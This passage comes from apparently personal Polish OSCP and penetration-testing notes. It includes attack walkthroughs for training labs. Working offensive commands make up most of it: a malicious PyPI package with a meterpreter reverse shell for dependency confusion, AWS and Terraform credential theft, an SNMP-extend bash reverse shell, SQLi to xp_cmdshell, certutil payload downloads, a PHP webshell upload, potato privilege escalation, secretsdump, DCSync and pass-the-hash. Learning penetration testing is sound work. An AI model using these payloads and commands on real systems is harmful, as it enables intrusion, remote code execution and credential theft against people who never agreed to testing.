> Używaj `sh` (nie Groovy — Groovy w sandboxie wymaga script approval). Po shellu na builderze — wyciągnij AWS creds wstrzyknięte przez `withAWS`:
```bash
env | grep AWS                                        # AWS_ACCESS_KEY_ID/SECRET → najszybsza droga do chmury
cat /proc/1/status | grep Cap; capsh --decode=<CapEff> # 3fffffffff = privileged (escape)
cat /proc/mounts | grep overlay                       # overlay + brak ifconfig = kontener Docker
```

## 13.7 Dependency confusion (przejęcie prywatnego pakietu pip)
> Gdy app to Python i używa `extra-index-url` (szuka w OBU indexach, bierze **najwyższą** wersję) — opublikuj na publicznym PyPI wyższą wersję prywatnego pakietu → prod ją zaciągnie.
```bash
# OSINT nazwy: requirements.txt / forum / nagłówki Server: Werkzeug (=Python). Sprawdź, że pakiet "brakuje":
pip download <pakiet>                                 # "No matching distribution" = confusion możliwy
# Złośliwy pakiet: RCE przy install (setup.py cmdclass) I przy import (utils.py __getattr__ + sys.excepthook)
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<mójIP> LPORT=4488   # dopisz na KONIEC utils.py
python3 ./setup.py sdist
twine upload --repository-url http://<pypi.cel>/ -u user -p pass dist/*      # wersja > prywatnej (~=1.1.0 → 1.1.2+)
# handler: msfconsole -x 'use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4488; set ExitOnSession false; run -jz'
```
> Prod przebudowuje zwykle ≤10 min. Nazwa pakietu: `from foo_util import x` → pakiet `foo-util` (dash), moduł `foo_util` (underscore). `remove_pkg` przez `curl --form ':action=remove_pkg'` by posprzątać zły upload.

## 13.8 Terraform state = klucze admina (JACKPOT) + pivot
> Bucket `tf-state-*` trzyma `terraform.tfstate` = **plaintext** IAM id+secret+polityki. User z `AdministratorAccess` = pełna kompromitacja. Klucze do bucketu bywają w źródle strony Jenkins **S3 Explorer** (client-side JS).
```bash
aws --profile stolen s3api list-buckets              # ujawnia bucket tf-state-*
aws --profile stolen s3 cp s3://tf-state-<x>/terraform.tfstate ./
cat -n terraform.tfstate                             # grep users + access id + secret + attached policy
aws configure --profile admin                        # id/secret usera z AdministratorAccess
aws --profile admin iam list-attached-user-policies --user-name <user>
```
Pivot do sieci wewnętrznej z kontenera **bez nmapa** (czysty Python — `socket`/`ipaddress`):
```bash
# netscan.py: socket.connect_ex()==0 = open; settimeout(0.2); skanuj /24 nie /16
python /netscan.py 172.30.0.1/24                      # np. wewnętrzny Jenkins 172.30.0.30:8080
```
> ⚠️ **Cleanup labu:** `sudo nmcli connection modify 'Wired connection 1' ipv4.dns '' && sudo systemctl restart NetworkManager` (inaczej psujesz sobie DNS), `rm ~/.pypirc ~/.config/pip/pip.conf`, usuń Firefox SOCKS proxy.

---

# 14. Reporting & Technical Report

> Zaangażowanie kończy się **raportem** — to on ma wartość dla klienta (i punkty na OSCP: dodatkowe 24h na raport). Notuj OD RAZU, nie po fakcie.

## 14.1 Notatki w trakcie
> Zapisuj na bieżąco: komendy, output, screenshoty (z widocznym IP celu + `whoami`), znalezione creds. Narzędzia: **Obsidian**, **CherryTree**, **Sysreptor**, **Joplin**. Screeny trzymaj w jednym folderze per host.
```bash
# Szybki dowód na maszynie (do wklejenia w raport):
hostname; whoami; ip a | grep inet          # Linux
cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
# Windows: type C:\Users\Administrator\Desktop\proof.txt & ipconfig & whoami
```
> **Ustrukturyzowana notatka findingu** (raport = przeklejka z notatek): `Application` · `URL` · `Request Type` (GET/POST + ręczne zmiany) · `Issue Detail` (klasa/CVE) · **`PoC Payload`** (dokładny string + WSZYSTKIE preconditions — najważniejsze pole, bez tego finding nieodtwarzalny). Notuj nawet „oczywiste" kroki (że działałeś jako admin).
> **Screeny:** `flameshot gui` — JEDEN koncept/obraz, widoczny URL + branding klienta + efekt PoC, caption ~8-10 słów, ZAWSZE podparte tekstem (sam alert XSS nie mówi za siebie).

## 14.2 Struktura raportu (OSCP / komercyjny)
> 1. **Executive Summary** — dla zarządu, bez żargonu: co, jak źle, co dalej.
> 2. **Scope & Methodology** — zakres (IP/domeny), okno czasowe, podejście (PTES/OSSTMM).
> 3. **Findings** — każde znalezisko: opis, **risk/CVSS**, dowód (**PoC** + screeny), **kroki reprodukcji**, **remediation** (konkretna rekomendacja).
> 4. **Attack Narrative / Walkthrough** — chronologiczny łańcuch: enumeracja → exploit → privesc → lateral, krok po kroku. Kluczowe na OSCP — oceniający musi ODTWORZYĆ Twoją drogę.
> 5. **Appendices** — pełne outputy, lista creds, użyte narzędzia.

> ✍️ Zasady: każdy krok reprodukowalny; screeny czytelne (IP + proof widoczne); dla OSCP dołącz `local.txt`/`proof.txt` z każdej maszyny. Brak reprodukowalności = brak punktów, nawet gdy „miałeś” roota.

> 🏢 **Wersja komercyjna (poza OSCP):**
> - **PRZED testem:** uzgodnij **RoE** (co zakazane: DoS/social eng, kto jest referee) i **framework compliance** (HIPAA/PCI przeszacowuje severity — TLS 1.0 = naruszenie PCI, nie tylko słaby szyfr).
> - **Executive Summary** (dla CISO/CFO): scope + timeframe + metodyka, **NIGDY absolutów** („unable to upload", nie „impossible" — miałeś ograniczony czas), kredytuj pozytywy hardeningu, **zapisz swój source IP + konta utworzone** (klient musi je usunąć).
> - **Testing Environment Considerations** — okoliczności łagodzące (późne creds, za mało czasu vs za duży scope).
> - **Technical Summary** — grupuj findingi po obszarach (Auth / Access Control / Patch Mgmt / Misconfig) + risk heat map; XSS+SQLi+upload razem = systemowy problem (niesanityzowany input → szkolenie devów).
> - **Remediation** — konkretna, NIE warstwowa (każdy krok = osobne rozwiązanie), różna per klient (szpital: izolacja/patch-later; bank: brak patcha = critical). Unikaj fixów, których nikt nie wdroży.

---

# 15. Wszystko i nic (worklog / stuck-buster)

> **Do czego to jest:** scratchpad na techniki/scenariusze, które kiedyś mnie zablokowały — zapisane **generycznie** (metoda, nie konkretna maszyna), żeby dało się użyć ponownie. Wszędzie `$ip` = cel, `$lhost` = Kali, `$user` = znaleziony login.

---

## Scenariusz: SNMP (161/udp) otwarty — enumeracja + abuse

**Trop:** SNMP z domyślnym community (`public`) wycieka userów, procesy z hasłami w cmdline, a przy community RW daje RCE jako root.

### snmpwalk — jak to czytać
```bash
# Skladnia:  snmpwalk -v<wersja> -c <community> $ip [OID]
#   -v1 / -v2c  = wersja (v2c SZYBSZE, domyslnie; -v1 tylko gdy v2c milczy)
#   -c public   = community string (RO=public, RW=private to najczestsze defaulty)
#   brak OID    = zrzuca CALE drzewo od korzenia (.1)
snmpwalk -v2c -c public $ip .1 > snmp_full.txt        # pelny zrzut
snmp-check $ip -c public                              # poukladany widok
# Najcenniejsze OIDy (naucz sie tych 4):
snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.2    # hrSWRunName        nazwy procesow
snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.4    # hrSWRunPath        sciezki binarek
snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.4.2.1.5    # hrSWRunParameters  ARGUMENTY <- tu leca hasla
snmpwalk -v2c -c public $ip 1.3.6.1.2.1.25.6.3.1.2    # hrSWInstalledName  zainstalowany soft
grep -iE 'pass|pwd|user|-c |mysql|ftp|key' snmp_full.txt
# Brak nazw MIB (widac iso.3.6...): sudo apt install snmp-mibs-downloader
#   + zakomentuj 'mibs :' w /etc/snmp/snmp.conf -> ladne nazwy zamiast cyfr.
```
> 💎 Z pola `description` userów, kontaktu i `NET-SNMP-EXTEND-MIB` często wyciekają **nazwy kont** i wskazówki o hasłach (np. skrypt „reset password to default"). Spisuj je jako listę loginów do dalszych ataków (SSH/spray).

### SNMP write → RCE jako root (gdy istnieje community RW)
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip  # znajdz community
snmpset -v2c -c private $ip iso.3.6.1.2.1.1.6.0 s TEST     # przechodzi = MASZ zapis (RW)
# jesli zapis dziala -> zarejestruj wlasny NET-SNMP extend i wykonaj jako root (snmpd = root):
snmpset -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 5 \
  'NET-SNMP-EXTEND-MIB::nsExtendCommand."x"' s /bin/bash \
  'NET-SNMP-EXTEND-MIB::nsExtendArgs."x"' s "-c 'bash -i >& /dev/tcp/$lhost/4444 0>&1'" \
  'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 1
# nc -lvnp 4444 PRZED; odczyt outputu = uruchomienie komendy (run-on-read):
snmpwalk -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."x"'
```

---

## Scenariusz: klucze SSH z anonymous FTP / czytelnego share (id_rsa)

**Trop:** anonymous FTP albo otwarty share oddaje `id_rsa`/`id_rsa_2`/`id_rsa.pub`. Klucz publiczny (komentarz) mówi, do kogo pasuje.
```bash
ftp $ip                                   # anonymous / anonymous (lub puste haslo)
wget -m --no-passive "ftp://anonymous:anonymous@$ip/"   # zrzuc cala zawartosc
chmod 600 id_rsa*                         # za otwarte perms => ssh IGNORUJE klucz i pyta o haslo
cat id_rsa.pub                            # komentarz = user@host -> POZNAJ wlasciciela
# wymus uzycie klucza + verbose; testuj kazdy klucz x kazdy znaleziony user:
ssh -v -o IdentitiesOnly=yes -i id_rsa $user@$ip
#   w -v szukaj: "Offering public key" / "Server accepts key"
# jesli pyta "Enter passphrase for key" => klucz zaszyfrowany, lam offline:
ssh2john id_rsa > id_rsa.hash ; john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
john id_rsa.hash --show                   # pokaz passphrase
```
> ⚠️ **Rozróżniaj prompty:** „*<user>'s password:*" = klucz odrzucony (złe perms / zły user / nieautoryzowany). „*Enter passphrase for key*" = klucz OK, tylko zaszyfrowany. Pierwszy prompt → napraw perms i user, ZANIM uznasz klucz za bezużyteczny.

---

## Scenariusz: słabe/„domyślne" hasło konta przez SSH
```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4 -f   # -f = stop po trafieniu
#   zgadnij tez recznie warianty od loginu: $user:$user, $user:password, $user:$user123
```
> 💎 Gdy enum (SNMP/web/share) sugeruje „hasło zresetowane do domyślnego" — najpierw ręcznie warianty loginu, potem rockyou. Uważaj na lockout policy.

---

## Scenariusz: Apache/nginx pokazuje tylko default page

**Trop:** statyczna strona domyślna („It works" / „Welcome to nginx") **nie ma parametru** → LFI/SQLi nie mają się gdzie wpiąć. Zaułek, dopóki nie znajdziesz aplikacji.
```bash
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40
gobuster vhost -u http://$ip --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```
> 💡 Nie forsuj LFI na statycznym default page — najpierw znajdź **dynamiczną** ścieżkę/parametr (dir/vhost bruteforce). Bez parametru nie ma czego wstrzykiwać.

---

# Appendix A — Skróty klawiszowe shell (readline)

| Akcja | Skrót | Mnemonik |
|-------|-------|----------|
| Przesuń o wyraz do przodu | `Alt + F` | **F**orward |
| Przesuń o wyraz do tyłu | `Alt + B` | **B**ackward |
| Na początek linii | `Ctrl + A` | **A** — pierwsza litera |
| Na koniec linii | `Ctrl + E` | **E**nd |
| Usuń wyraz do tyłu | `Ctrl + W` (lub `Alt + Backspace`) | **W**ord (w lewo) |
| Usuń wyraz do przodu | `Alt + D` | **D**elete (w prawo) |
| Usuń wszystko na lewo | `Ctrl + U` | od kursora do początku |
| Usuń wszystko na prawo | `Ctrl + K` | **K**ill (do końca) |
| Wyczyść ekran | `Ctrl + L` | c**L**ear |
| Szukaj w historii | `Ctrl + R` | **R**everse search |
| Przerwij / wklej ostatni kill | `Ctrl + C` / `Ctrl + Y` | Yank |

---

---

# Appendix B — OSCP Exam Playbook / Metodyka

> Egzamin: **~24h + 24h na raport**. Zwykle 3 maszyny standalone (po 20 pkt) + zestaw AD (40 pkt, łańcuch 3 hostów). **70/100** do zdania.
> Konfiguracja może się zmieniać — sprawdź aktualny Exam Guide OSCP przed podejściem.

## B.1 Zasady, które ratują egzamin
- **AD najpierw albo standalone najpierw?** Jeśli masz AD (40 pkt) — często opłaca się je zrobić w całości (all-or-nothing: 3 hosty łańcuchem). Ale jak utkniesz >2h, przełącz się na standalone i wróć.
- **Rób screenshoty NA BIEŻĄCO** — każdy `whoami`, `hostname`, `ip a` na maszynie + `type proof.txt` / `cat proof.txt`. Bez proofa = 0 punktów, nawet z rootem.
- **Rób notatki NA BIEŻĄCO** (CherryTree / Obsidian / Sublime) — komenda + output. Raport piszesz z notatek, nie z pamięci.
- **Restartuj maszynę** jeśli exploit się „zużył" / usługa padła (panel egzaminacyjny ma revert).
- **Metasploit: limit** — możesz użyć MSF/meterpreter na **JEDNEJ** maszynie standalone. `multi/handler` i msfvenom nie liczą się do limitu. Nie marnuj limitu za wcześnie.
- **Zakazane:** narzędzia automatyzujące eksploitację (sqlmap na exam targets — dozwolone tylko do identyfikacji, nie do exploitacji; commercial tools; automatyczne exploit skanery jak Autorecon jest OK do enumeracji). Sprawdź aktualną listę zakazów!
- **Try harder = try different**. Utknąłeś? → wróć do enumeracji. 90% blokad to pominięty port/plik/parametr.

## B.2 Metodyka na każdą maszynę (pętla)
```
1. FULL nmap (-p- -sV -sC)  +  UDP top-ports. Zapisz każdy port.
2. Dla KAŻDEJ usługi: wersja → searchsploit → default creds → ręczna enumeracja.
3. Web: gobuster/ffuf + ręczne klikanie + view-source + /robots.txt. Każdy input testuj (SQLi/LFI/upload/cmdi).
4. Znalazłeś ślad? Wyeksploatuj → foothold → STABILIZUJ shell (TTY).
5. Post-exploit enum: linpeas/winpeas. Przejrzyj CAŁY output.
6. Privesc → root/SYSTEM → proof.txt + screenshot.
7. Loot: hasła, hashe, klucze SSH → mogą otworzyć następny host (pivoting/AD).
```
```bash
searchsploit <usługa> <wersja>          # szukaj gotowych exploitów lokalnie
searchsploit -m 12345                    # skopiuj exploit do bieżącego katalogu
```

## B.3 Checklist enumeracji per-port (najczęstsze wektory)
| Port | Usługa | Pierwsze kroki |
|------|--------|----------------|
| 21 | FTP | anon login (`ftp $IP` → anonymous), `ls`, wersja → searchsploit |
| 22 | SSH | wersja, klucze z lootu, `-oPubkeyAuthentication` |
| 25 | SMTP | `VRFY user` (enum userów), open relay |
| 53 | DNS | zone transfer `dig axfr` |
| 80/443 | HTTP(S) | gobuster/ffuf, whatweb, source, SSL cert (nazwy!), vhosts |
| 111 | RPCbind | `rpcinfo -p $IP`, NFS |
| 139/445 | SMB | enum4linux-ng, smbclient -N, smbmap, wersja → EternalBlue? |
| 161 | SNMP | snmpwalk, community strings |
| 389/636 | LDAP | ldapsearch anon bind |
| 1433 | MSSQL | impacket-mssqlclient, xp_cmdshell |
| 2049 | NFS | `showmount -e $IP`, mount + no_root_squash privesc |
| 3306 | MySQL | default creds, wersja |
| 3389 | RDP | xfreerdp, BlueKeep? |
| 5985/5986 | WinRM | evil-winrm z creds/hash |
| 6379 | Redis | unauth `redis-cli -h $IP`, webshell/SSH key write |

```bash
showmount -e $IP                         # NFS eksporty — szukaj no_root_squash → privesc
rpcinfo -p $IP                           # co RPC wystawia
smbclient -L //$IP -N                    # SMB anon
```

## B.4 Najczęstsze pułapki (rabbit holes)
- **Pominięty port** — skanuj **-p-**, nie top-1000. UDP też (SNMP/TFTP/SMTP).
- **Nie przeczytany cały linpeas/winpeas** — odpowiedź często jest w środku (żółto-czerwone highlighty).
- **Nie przetestowany każdy input** — parametry GET/POST, nagłówki (User-Agent, X-Forwarded-For, Cookie).
- **Ignorowanie `sudo -l`** i `whoami /priv` — pierwsza rzecz po foothold.
- **Reużycie haseł** — hasło z jednej usługi/hosta próbuj wszędzie (spray).
- **Za wczesne palenie MSF** na maszynie, która ma prosty ręczny exploit.
- **Grzebanie w exploicie zamiast enumeracji** — jak coś nie działa 30 min, wróć do enum.

## B.5 Proof i raport
```bash
# Zbierz dowód na każdej maszynie:
whoami && hostname && ip a          # (Linux) / whoami && hostname && ipconfig  (Windows)
cat proof.txt                       # / type proof.txt
```
- Raport w **Markdown → PDF**, szablon OffSec. Każdy krok: opis + komenda + screenshot + output.
- Musi być **odtwarzalny** — ktoś inny ma powtórzyć atak z Twojego raportu.
- Deadline raportu to twarde 24h po egzaminie. Pisz notatki tak, żeby raport = przeklejka + opis.

## B.6 Arsenał do przećwiczenia PRZED egzaminem
`nmap` • `ffuf`/`gobuster` • `searchsploit` • `linpeas`/`winpeas`/`pspy` • `hydra` •
`impacket-*` (psexec/wmiexec/secretsdump/GetNPUsers/GetUserSPNs) • `evil-winrm` •
`crackmapexec/netexec` • `chisel`/`ligolo-ng` (pivoting!) • `mimikatz`/`Rubeus` •
`BloodHound` • `xfreerdp` • ręczne PtH/PtT/PtK.
> 🔗 Trening: PG Practice (Proving Grounds), HTB (OSCP-like list TJ_Null), TryHackMe (ścieżki AD/Offensive).

---

> **Uwaga o utrzymaniu pliku:** dopisuj nowe komendy do właściwej fazy kill chain, a nie na koniec.
> Gdy komenda pasuje do kilku faz (np. `smbclient` — recon i lateral), trzymaj ją w fazie *pierwszego* użycia i linkuj/wspominaj w drugiej.

---

# Appendix C — Medtech Challenge Lab (walkthrough, styl kursowy)

> Duży łańcuch: brzegowy web (SQLi) → pivot → cała domena `medtech.com`. Pisane prosto — jedna komenda = jeden krok, z wyjaśnieniem. Wartości flag zredagowane (`<proof>`) — to publiczna strona. `<KALI>` = Twój tun0.
> Hosty: WEB02 `192.168.224.121` (wejście, dual-homed do `172.16.224.254`), FILES02 `172.16.224.11`, DC01 `172.16.224.10`.
>
> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** flagę pokaż w **interaktywnym shellu** (`type`/`cat`) + screenshot z IP. **Zero punktów** za flagę z webshella lub jednorazowego `-cmd`. Tu WEB02 czytasz z reverse shella (nc), FILES02 z `evil-winrm`, DC01 z `wmiexec` — wszystko interaktywne = OK.

## C.1 Rozpoznanie
```bash
nmap -sV -p- --min-rate 2000 192.168.224.121
```
WEB02 = IIS/ASP.NET (strona „MedTech") + SMB + WinRM. Sieć wewnętrzna `172.16.224.0/24` — dojdziemy przez pivot.

## C.2 WEB02 — SQL Injection na login.aspx
Strona logowania to ASP.NET WebForms. Ważne: przy każdym POST musisz wysłać świeże pola `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` (pobierz je GET-em tuż przed). Najprościej użyć **Burp Repeater** (albo sqlmap z zapisanego requestu).
```bash
# potwierdzenie iniekcji - w polu username wpisz payload psujący składnię (błąd MSSQL wyjdzie na stronie):
#   ' OR 1=1#          -> "Incorrect syntax near '#'" = Microsoft SQL Server
# potwierdź, że iniekcja wykonuje osobne polecenia (stacked) opóźnieniem czasowym:
#   ';WAITFOR DELAY '0:0:5'-- -                                  (odpowiedź po ~5s)
#   ';IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:5'-- - (5s = jesteśmy sysadmin)
```
Alternatywnie automatem (zapisz request z Burpa do pliku `login.req`):
```bash
sqlmap -r login.req --batch --dbms=mssql --technique=T          # potwierdź; potem --os-shell dla RCE
```

## C.3 WEB02 — z SQLi do RCE (xp_cmdshell) i shell
```bash
# w polu username, jako sysadmin, włącz xp_cmdshell (każdy payload to osobny POST ze świeżym viewstate):
#   ';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
# test wykonania - ping do siebie i podsłuch:
sudo tcpdump -i tun0 icmp
#   ';EXEC master..xp_cmdshell 'ping <KALI>'-- -
```
Reverse shell (PowerShell, metoda z kursu):
```bash
nc -lvnp 443                                                     # listener na Kali
# wygeneruj payload base64 (przykład z modułu; podmień IP/port), potem:
#   ';EXEC master..xp_cmdshell 'powershell -e <BASE64>'-- -
```
Shell wraca jako konto usługi MSSQL. `type C:\inetpub\wwwroot\web.config` → connection string `sa`. `ipconfig` → WEB02 ma też `172.16.224.254` (most do domeny).

## C.4 WEB02 — PrivEsc do SYSTEM (SeImpersonate)
```bash
# w shellu: whoami /priv  -> SeImpersonatePrivilege = Enabled
# hostuj narzędzia na Kali:
python3 -m http.server 8000        # w katalogu z PrintSpoofer64.exe i nc.exe
# na WEB02 pobierz i uruchom:
#   certutil -urlcache -split -f http://<KALI>:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
#   certutil -urlcache -split -f http://<KALI>:8000/nc.exe C:\Windows\Temp\nc.exe
# nowy listener: nc -lvnp 4445 na Kali, potem na WEB02:
#   C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe <KALI> 4445 -e cmd.exe"     -> nt authority\system
# flaga: type C:\Users\Administrator\Desktop\proof.txt   (= <proof>)
```

## C.5 WEB02 — zbierz creds (jako SYSTEM)
```bash
# na WEB02 zrzuć hive'y rejestru:
#   reg save HKLM\SAM C:\Windows\Temp\sam /y
#   reg save HKLM\SYSTEM C:\Windows\Temp\system /y
#   reg save HKLM\SECURITY C:\Windows\Temp\security /y
# przenieś pliki na Kali (np. przez SMB) i wyciągnij:
impacket-secretsdump -sam sam -system system -security security LOCAL
#   -> plaintext DefaultPassword: Flowers1  + cached DCC2 dla joe
```

## C.6 Pivot do sieci wewnętrznej (chisel)
```bash
chisel server -p 8080 --reverse            # na Kali
# na WEB02: pobierz chisel.exe (certutil, jak wyżej) i odpal klienta:
#   C:\Windows\Temp\chisel.exe client <KALI>:8080 R:socks
# -> SOCKS 127.0.0.1:1080. Do wewnątrz: proxychains -q <narzędzie>
```

## C.7 FILES02 — spray creds → shell + creds
```bash
# spray hasła po sieci wewnętrznej (nxc pokaże (Pwn3d!) gdzie konto jest adminem):
proxychains -q nxc smb 172.16.224.0/24 -u joe -p 'Flowers1' -d medtech.com
#   -> joe jest lokalnym adminem na FILES02
proxychains -q evil-winrm -i 172.16.224.11 -u joe -p 'Flowers1'     # shell + flagi
# zrzut creds zdalnie (joe = admin):
proxychains -q impacket-secretsdump 'medtech.com/joe:Flowers1@172.16.224.11'
#   -> cached DCC2 dla yoshi, wario
```

## C.8 Łamanie DCC2
```bash
# skopiuj hashe DCC2 do pliku dcc2.txt (format $DCC2$...), potem:
hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt
#   -> yoshi : Mushroom!   (i wario : Mushroom!)
```

## C.9 Droga do DC — konto w Backup Operators
```bash
# enumeracja: kto jest uprzywilejowany (adminCount=1) i w jakich grupach:
proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --admin-count
proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --query "(sAMAccountName=joe)" "memberOf"
#   -> joe (którego mamy) jest w grupie "Backup Operators"
```
`Backup Operators` = prawo czytania dowolnego pliku/rejestru (SeBackupPrivilege). Zrzuć rejestr DC:
```bash
# zapisz hive'y DC do NETLOGON (czytelne dla każdego usera, bo joe nie jest adminem i nie wejdzie na C$):
proxychains -q impacket-reg medtech.com/joe:'Flowers1'@172.16.224.10 backup -o 'C:\Windows\SYSVOL\domain\scripts'
# pobierz je jako joe przez share NETLOGON:
proxychains -q impacket-smbclient medtech.com/joe:'Flowers1'@172.16.224.10
#   use NETLOGON ; get SAM.save ; get SYSTEM.save ; get SECURITY.save ; exit
# wyciągnij hash konta maszyny DC:
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
#   -> $MACHINE.ACC : <hash DC01$>
```

## C.10 DCSync → cała domena → flaga na DC
```bash
# konto maszyny DC ma prawa replikacji -> DCSync:
proxychains -q impacket-secretsdump -just-dc -hashes :<hash_DC01$> 'medtech.com/DC01$@172.16.224.10'
#   -> Administrator NTLM, krbtgt, leon (Domain Admin)...
# wejdź na DC domenowym Administratorem (Pass-the-Hash) i weź flagę:
proxychains -q impacket-wmiexec -hashes :<hash_Administrator> medtech.com/Administrator@172.16.224.10
#   type C:\Users\Administrator\Desktop\proof.txt   (= <proof>)
# domenowy Administrator = admin wszędzie -> zbierz flagi z pozostałych hostów tym samym hashem.
```

## C.11 Sprzątanie (oceniane wg reguł)
```bash
# usuń narzędzia i zrzuty które zostawiłeś, szczególnie z NETLOGON (widoczne dla całej domeny!):
#   del C:\Windows\SYSVOL\domain\scripts\SAM.save ...\SYSTEM.save ...\SECURITY.save
#   del C:\Windows\Temp\ps.exe C:\Windows\Temp\nc.exe C:\Windows\Temp\chisel.exe
#   przywróć xp_cmdshell do stanu wyłączonego: ';EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;-- -
# zamknij tunele/listenery na Kali.
```
# Appendix D — OSCP Challenge Lab A (walkthrough, styl kursowy)

> 6 maszyn: 3 standalone (`.143`,`.144`,`.145`) + 3 w AD `oscp.exam` (MS01 `.141`, DC01 `10.10.224.140`, MS02 `10.10.224.142`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>` = Twój tun0.
> Pisane prosto, jedna komenda = jeden krok, z wyjaśnieniem. Zrobione: **.143 (root)**, **MS01 (SYSTEM)**. Reszta — patrz D.6 (uczciwy stan + jak dokończyć).
>
> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** `local.txt`/`proof.txt` MUSISZ pokazać w **interaktywnym shellu** komendą `type`/`cat` z oryginalnej lokalizacji + screenshot z IP celu. **Zero punktów** za flagę z webshella, przez `exploit.py --cmd`, lub `-cmd '...type...'` jednorazówką. Windows: SYSTEM/Administrator/admin shell. Linux: root shell. `evil-winrm`/`psexec`/`wmiexec`/`ssh`/reverse shell = **OK**; webshell = **NIE**.

## D.1 Rozpoznanie sieci
```bash
# osiągalne wprost są .141/.143/.144/.145 (192.168.224.x); 10.10.224.x tylko przez pivot
nmap -sV -p- --min-rate 2000 192.168.224.141
nmap -sV -p- --min-rate 2000 192.168.224.143
nmap -sV -p- --min-rate 2000 192.168.224.144
nmap -sV -p- --min-rate 2000 192.168.224.145
```
Kluczowe: `.141` = IIS/Apache + **Attendance and Payroll System** (port 81) → wejście do AD. `.143` = porty 3000-3003 nietypowe. `.145` = port 1978 (RemoteMouse).

## D.2 Standalone .143 — Aerospike → root
```bash
# porty 3000-3003 nie mówią HTTP -> sprawdź protokół tekstowy:
printf 'version\r\n' | nc 192.168.224.143 3003        # -> Aerospike Community Edition build 5.1.0.1
# 5.1.0.1 jest podatne (CVE-2020-13151). Publiczny exploit:
searchsploit Aerospike
searchsploit -m multiple/remote/49067.py
python3 -m venv venv && ./venv/bin/pip install aerospike     # exploit potrzebuje klienta python
# exploit ma błędny check wersji + krótki timeout -> popraw w 49067.py:
#   w funkcji _is_vuln() dodaj na początku:  return True
#   w client.apply(...) dodaj policy: {'total_timeout':60000,'socket_timeout':60000}
# RCE jako aero (blind, io.popen zwraca output — to NIE interaktywny shell):
./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd 'id'
```
> ⚠️ **REGUŁA OSCP: flaga TYLKO z interaktywnego shella (`cat`), nie przez exploit `--cmd` = 0 pkt.** Egress bywa filtrowany (brak reverse shella), ale **SSH (22) jest inbound** — wgraj swój klucz przez RCE i zaloguj się interaktywnie.
```bash
ssh-keygen -f aero_key -N ''
KEY=$(cat aero_key.pub)
./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd "mkdir -p /home/aero/.ssh; echo $KEY > /home/aero/.ssh/authorized_keys; chmod 600 /home/aero/.ssh/authorized_keys"
ssh -i aero_key aero@192.168.224.143            # INTERAKTYWNY shell jako aero
#   w tym shellu:  cat /home/aero/local.txt       <-- LOCAL.TXT (interaktywny shell, cat)
# PrivEsc — SUID screen 4.05.00 (CVE-2017-5618):
find / -perm -4000 -type f 2>/dev/null           # -> /usr/bin/screen-4.5.0
searchsploit screen 4.5.0                         # 41154 (libhax.so kompiluj na Kali, wgraj base64)
# lancuch EDB 41154 tworzy SUID /tmp/rootbash:
/tmp/rootbash -p                                  # INTERAKTYWNY root shell
#   w root shellu:  cat /root/proof.txt           <-- PROOF.TXT (interaktywny root shell, cat)
```

## D.3 MS01 (.141) — Attendance and Payroll System → SYSTEM
> ⚠️ **REGUŁA OSCP: webshell służy TYLKO do zdobycia dostępu — flag NIGDY nie czyta się z webshella (`shell.php?cmd=type` = 0 pkt).** Użyj webshella do privesc, a flagę czytaj z **interaktywnego shella** (reverse shell / evil-winrm) jako SYSTEM/admin. (MS01 to host AD — proof jest tylko na DC01, patrz D.6.)
```bash
# publiczny unauth RCE (upload webshella):
searchsploit Attendance Payroll        # 50801 (RCE) / 50802 (SQLi)
# webshell (jak w materiałach - prosty cmd shell):
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
# upload przez podatny endpoint (aplikacja jest w web-root, więc bez /apsystem):
curl -F "id=1" -F "upload=" -F "photo=@shell.php;filename=shell.php" http://192.168.224.141:81/admin/employee_edit_photo.php
# webshell ląduje w /images/ :
curl "http://192.168.224.141:81/images/shell.php?cmd=whoami"     # -> ms01\mary.williams
```
PrivEsc — SeImpersonate → SYSTEM (metoda z kursu):
```bash
# whoami /priv przez webshell -> SeImpersonatePrivilege -> potato
# hostuj narzędzia na Kali:
python3 -m http.server 8000       # w katalogu z GodPotato-NET4.exe, nc.exe
# na MS01 (przez webshell, cmd=...):
#   certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
#   C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"     -> nt authority\system
# jako SYSTEM: reg save HKLM\SAM/SYSTEM/SECURITY -> impacket-secretsdump ... LOCAL (lokalne hashe)
# łup: admin/includes/conn.php -> MySQL root : TreeFlaskDomestic505
```

## D.4 Pivot do sieci AD (chisel)
```bash
